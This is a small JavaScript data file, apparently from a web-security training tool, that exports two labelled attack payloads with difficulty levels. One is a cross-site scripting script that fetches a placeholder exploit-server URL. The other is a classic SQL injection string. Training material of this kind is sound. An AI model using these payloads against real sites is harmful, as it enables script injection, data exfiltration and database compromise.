export const payloads = [
    {
        id: 'p1',
        payload: "<script>fetch('https://{exploit_server}/{carlos}')</script>",
        categories: ['xss', 'sqli'],
        level: 'Practitioner'
    },
    {
        id: 'p2',
        payload: "' OR '1'='1",
        categories: ['sqli'],
        level: 'Apprentice'
    }
];
